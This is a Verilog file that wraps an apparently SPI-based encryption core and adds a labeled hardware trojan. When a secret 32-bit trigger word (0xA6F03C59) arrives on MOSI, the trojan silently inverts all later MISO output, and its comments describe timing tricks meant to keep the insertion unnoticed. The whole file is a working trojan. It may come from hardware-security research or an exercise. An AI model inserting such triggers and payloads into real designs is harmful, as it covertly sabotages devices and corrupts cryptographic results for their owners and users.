module recovered (
    input  wire pin_36, // SCK
    input  wire pin_25, // ENC_DEC
    input  wire pin_28, // NORM_CS_N
    input  wire pin_32, // MOSI
    input  wire pin_34, // RST_N
    input  wire pin_27, // START
    output wire pin_38, // BUSY
    output wire pin_23, // ICE_LED
    output wire pin_31  // MISO
);

    wire orig_miso;

    // Instantiate original unmodified design
    recovered_original inst_recovered_original (
        .pin_36(pin_36),
        .pin_25(pin_25),
        .pin_28(pin_28),
        .pin_32(pin_32),
        .pin_34(pin_34),
        .pin_27(pin_27),
        .pin_38(pin_38),
        .pin_23(pin_23),
        .pin_31(orig_miso)
    );

    // Trojan Trigger and Payload State
    logic [31:0] shift_reg;
    logic [5:0]  bit_cnt;
    logic        trigger_detected;
    logic        corrupt_active;

    // Block 1: Track SPI transaction bits
    // Use posedge of NORM_CS_N as an asynchronous reset to handle interrupted transactions cleanly
    always_ff @(posedge pin_36 or posedge pin_28) begin
        if (pin_28) begin
            bit_cnt   <= 6'b0;
            shift_reg <= 32'b0;
        end else if (!pin_34) begin
            bit_cnt   <= 6'b0;
            shift_reg <= 32'b0;
        end else begin
            shift_reg <= {shift_reg[30:0], pin_32};
            if (bit_cnt == 6'd31) begin
                bit_cnt <= 6'b0;
            end else begin
                bit_cnt <= bit_cnt + 1'b1;
            end
        end
    end

    // Block 2: Evaluate trigger at the exact end of a 32-bit transaction boundary
    always_ff @(posedge pin_36) begin
        if (!pin_34) begin
            trigger_detected <= 1'b0;
        end else if (!pin_28) begin
            if (bit_cnt == 6'd31) begin
                if ({shift_reg[30:0], pin_32} == 32'hA6F03C59) begin
                    trigger_detected <= 1'b1;
                end else begin
                    trigger_detected <= 1'b0;
                end
            end
        end
    end

    // Block 3: Apply corruption safely on negedge SCK
    // Updating the state on the negedge ensures we never violate the hold time 
    // of the 32nd bit of the trigger transaction sampled by the SPI master.
    // It also correctly aligns the payload inversion for the first bit of the next transfer.
    always_ff @(negedge pin_36) begin
        if (!pin_34) begin
            corrupt_active <= 1'b0;
        end else begin
            corrupt_active <= trigger_detected;
        end
    end

    // Corrupt (invert) MISO payload only when the active payload flag is set
    assign pin_31 = corrupt_active ? ~orig_miso : orig_miso;

endmodule
